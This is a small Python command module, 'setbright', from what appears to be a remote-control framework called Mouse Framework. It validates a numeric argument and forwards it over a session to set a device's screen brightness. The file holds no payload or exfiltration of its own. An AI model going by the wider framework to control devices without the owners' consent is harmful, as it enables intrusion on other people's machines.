#!/usr/bin/env python3

#            ---------------------------------------------------
#                              Mouse Framework                                 
#            ---------------------------------------------------
#                Copyright (C) <2019-2020>  <Entynetproject>
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

class command:
    def __init__(self):
        self.name = "setbright"
        self.description = "Set screen brightness."
        self.usage = "Usage: setbrigh <level: 0-1>"
        self.type = "native"
    
    def run(self,session,cmd_data):
        try:
            float(cmd_data["args"])
        except:
            print(self.usage)
            return
        session.send_command(cmd_data)
